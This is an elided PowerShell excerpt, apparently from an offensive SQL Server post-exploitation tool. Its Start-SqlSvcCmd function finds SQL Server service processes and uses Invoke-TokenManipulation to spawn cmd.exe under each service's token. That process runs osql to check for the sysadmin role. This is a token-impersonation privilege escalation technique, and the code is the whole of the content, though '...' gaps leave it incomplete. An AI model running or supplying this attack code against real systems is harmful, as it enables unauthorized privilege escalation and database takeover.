...
# Function: JosephBialek's Invoke-TokenManipulation.ps1
...
# Function: Start-SqlSvcCmd
function Start-SqlSvcCmd{
    Write-Host "Getting list of SQL Server services..."
    $SqlServices = Get-WmiObject -Class win32_service | where {$_.pathname -like "*sqlservr.exe*"} | select displayname,pathname,StartName 
    ...
    ForEach-Object {
        ...
        ForEach-Object {
            ...
            $s_instance = $_.displayname.split('(')[1].split(')')[0]
            $s_fullinstance = "$env:COMPUTERNAME\$s_instance"
            ...
            if($s_pathname -like "$p_ExecutablePath"){
                ...
                Invoke-TokenManipulation -CreateProcess 'cmd.exe' -ProcessArgs "/c osql -E -S $s_fullinstance -q `"select @@version;select is_srvrolemember('sysadmin')`"" -ProcessId $p_processid -ErrorAction SilentlyContinue
            }
        }    
    }
